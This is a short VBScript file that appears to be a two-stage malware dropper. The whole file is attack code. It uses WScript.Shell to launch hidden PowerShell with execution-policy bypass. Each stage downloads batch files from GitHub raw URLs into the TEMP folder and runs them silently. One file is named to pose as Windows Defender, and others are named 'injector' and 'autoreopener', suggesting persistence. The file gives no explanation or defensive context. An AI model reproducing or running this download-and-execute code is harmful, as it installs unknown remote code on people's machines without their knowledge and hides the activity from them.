Set WshShell = CreateObject("WScript.Shell")

downloads = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")


' =====================================================
' FIRST STAGE
' =====================================================
pscom = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexinject/windows/main/windowsdef.bat' " & _
    "-OutFile ""$env:TEMP\windowsdef2.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' " & _
    "-FilePath ""$env:TEMP\windowsdef2.bat"" -Wait;"

cm = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
      Chr(34) & pscom & Chr(34)

WshShell.Run cm, 0, True



' =====================================================
' SECOND STAGE
' =====================================================
psCommand = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.bat' " & _
    "-OutFile ""$env:TEMP\inh.bat""; " & _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat' " & _
    "-OutFile ""$env:TEMP\autoreopener.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' " & _
    "-FilePath ""$env:TEMP\inh.bat"" -Wait;"


cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
      Chr(34) & psCommand & Chr(34)

WshShell.Run cmd, 0, True
